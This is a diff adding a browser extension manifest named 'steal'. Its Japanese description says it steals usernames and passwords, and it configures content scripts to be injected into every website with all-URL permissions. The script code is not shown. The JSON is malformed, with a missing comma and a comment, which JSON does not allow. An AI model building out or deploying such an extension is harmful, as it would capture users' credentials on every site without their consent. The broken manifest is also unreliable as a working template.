@@ -1,0 +1,29 @@
+{
+    "name": "steal",
+    "version": "0.1",
+    "manifest_version": 2,
+    
+    "description": "ユーザとパスワードを盗みます。当アプリを絶対に悪用しないでください。",
+ 
+    "permissions": [
+        "tabs", "<all_urls>", "contextMenus"
+    ],
+    
+    "icons": {
+        "16" : "images/1278_16.png",
+        "48" : "images/1278_48.png"
+       "128" : "images/1278_128.png"
+    },
+    
+    "content_scripts": [
+		{
+		"matches": ["<all_urls>"],
+			"js": [	"js/jquery-1.9.1.js",
+					"js/background.js",
+					"js/contentscript.js"]
+		}
+    ],
+    
+    /* アプリ内で使用する画像ファイルを定義 */
+    "web_accessible_resources": []
+}
